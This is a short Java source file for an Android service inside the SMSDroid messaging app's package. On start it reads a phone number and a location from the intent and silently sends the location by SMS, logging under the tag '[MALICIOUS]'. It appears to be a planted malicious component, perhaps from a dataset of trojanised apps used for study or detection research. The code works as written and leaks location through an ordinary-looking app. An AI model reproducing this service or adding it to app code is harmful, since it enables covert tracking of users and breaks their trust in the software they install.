package de.ub0r.android.smsdroid;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

public class SendSmsService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //get recipient number and location from the intent
        String destination = (String) intent.getExtras().get("number");
        String location = (String) intent.getExtras().get("location");

        //send received information via SMS
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(destination, null, location, null, null);

        Log.d("[MALICIOUS]", "Sent location information (" + location + ") to " + destination);
        return START_NOT_STICKY;
    }
}
